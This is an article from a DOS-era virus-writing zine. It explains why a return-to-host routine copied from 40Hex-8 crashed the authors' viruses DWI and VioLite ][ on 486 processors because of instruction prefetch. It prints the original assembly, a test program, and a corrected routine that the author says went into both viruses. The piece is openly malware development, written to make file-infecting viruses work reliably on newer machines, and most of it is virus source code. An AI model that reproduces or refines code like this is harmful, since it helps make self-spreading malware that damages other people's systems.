                        ===============================  
                          'Shit... What's wrong NOW!'
                            By The Attitude Adjuster
                        ===============================

        (Written in early January, pre-VioLite ][ and DWI release.)

        So, AccuPunk and  I are  hard at  work, coding litle bits of drivel,
 and our  two main  projects, DWI  and  VioLite ][. For some strange reason,
 these viruses  refused to  work. We  spent many hours in our protected-mode
 debuggers tracking  down the  cause, but,  it  was finally my genius, and a
 little work in DOS Debug that saved the day.

        The  virus  engines  worked  fine,  the resident  code  in DWI being
 okay, and  the file-location code in VioLite2 being dandy. When traced thru
 in both SoftIce and Debug, the  viruses would work, but, yet, when ran from
 a command line, or let loose with a Go instruction,  my machine would crash
 a horrible GPF death, while AccuPunk's  would not.  He  has a 386DX, I have
 a new 486SX, this is the key.

        Here is the root of the problem.

 ===========================================================================
 Taken from 'An Introduction to Non-Overwriting Virii,' 40Hex-8
            
            mov  ax,es                    ; AX = PSP segment
            add  ax,10h                   ; Adjust for PSP
            add  word ptr cs:[si+jmpsave+2],ax
            add  ax,word ptr cs:[si+stacksave+2]
            cli                           ; Clear intrpts for stack manip.
            mov  sp,word ptr cs:[si+stacksave]
            mov  ss,ax
            sti
            db   0eah                ; jmp ssss:oooo
jmpsave          dd ?                ; Original CS:IP
stacksave        dd ?                ; Original SS:SP
jmpsave2         dd 0fff00000h       ; Needed for carrier file
stacksave2       dd ?
 ===========================================================================

        We were using this  clip of DA code, mainly because it was the Right
 Thing, and why try and improve on perfection.  Alas, this  code is the root
 of all the problems.

        I assemble the following code:
 
 ===========================================================================
.model tiny
.code
        org     100h

start:
        mov     byte ptr [start], 0cch          ; place int 3 at 100h

        mov     ax, cs                          ; codeseg in ax

        add     word ptr [JumpAdd+2], ax        ; add to jmp far ptr

        db      0eah
JumpAdd dd      00000100h       ; cs:0100

        end start
 ===========================================================================

        It  crashes miserably on my  machine, but not on my 8086. I now know
 why. Hurredly, I recoded the thing to look like this:

 ===========================================================================
.model tiny
.code
        org     100h

start:
        mov     byte ptr [start], 0cch          ; place int 3 at 100h

        mov     ax, cs                          ; codeseg in ax

        add     word ptr [JumpAdd+2], ax        ; add to jmp far ptr

        jmp     short aftajump

PreJump:        
        db      0eah
JumpAdd dd      00000100h       ; cs:0100
AftaJump:
        jmp     short prejump

        end start
 ===========================================================================

        This time,  the code works, I have my cuprit, my processor, and it's
 blasted 25 byte prefetch.

        Let me  explain. When  we affected the JMP  FAR offset in memory, we
 did not  affect it in the processor, which pre-fetches the next 25 bytes in
 memory. The JMP  around the code  causes the prefetch to  be reloaded,  and
 allows the jump to work.

        So, this means, an entire group of viruses will not work on newer hi
 end machines. I  tested this, all  viruses I ran  that had the DA engine in 
 them crashed and burned on every  486 that I tested them on. Any 80486 that
 is exactly  Intel specs (and they all will be for a while, as only Intel is
 making them) will crash on this code.

        The solution? Here's mine, it may not be pretty, but, it works.

 ===========================================================================
            mov  ax,es                    ; AX = PSP segment
            add  ax,10h                   ; Adjust for PSP
            add  word ptr cs:[si+stacksave+2], ax
            
            cli                           ; Clear intrpts for stack manip.
            mov  sp,word ptr cs:[si+stacksave]
            mov  ss,ax
            sti
            
            mov  bx, word ptr cs:[si+jmpsave]
            add  bx, ax
            push bx

            mov  bx, word ptr cs:[si+jmpsave+2]
            add  bx, ax
            push bx

            retf 
jmpsave          dd ?                ; Original CS:IP
stacksave        dd ?                ; Original SS:SP
jmpsave2         dd 0fff00000h       ; Needed for carrier file
stacksave2       dd ?
 ===========================================================================

        This is the final code we put into DWI and VioLite2. Not pretty, but
 the damn thing  works. With  no self-modifying  code  that  relies  on  the
 prefetch, there isn't an easy way for this to crash...
